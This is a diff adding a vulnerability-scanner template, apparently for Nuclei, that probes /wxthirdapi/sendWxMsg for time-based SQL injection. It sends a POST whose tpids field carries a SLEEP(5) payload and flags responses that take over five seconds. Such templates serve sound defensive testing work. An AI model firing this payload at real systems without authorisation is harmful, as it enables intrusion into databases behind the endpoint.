@@ -1,0 +1,26 @@
+id: sql-injection-sleep
+
+info:
+  name: SQL Injection Sleep Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    This template detects SQL Injection via time-based payload using sleep function. It sends a POST request with a payload that delays the response if the SQL Injection is successful.
+  tags: sqli,time-based
+
+http:
+  - raw:
+      - |
+        POST /wxthirdapi/sendWxMsg HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        tpids=1' AND (SELECT 1666 FROM (SELECT(SLEEP(5)))XvSM) AND 'KAkS'='KAkS
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - "duration > 5000"
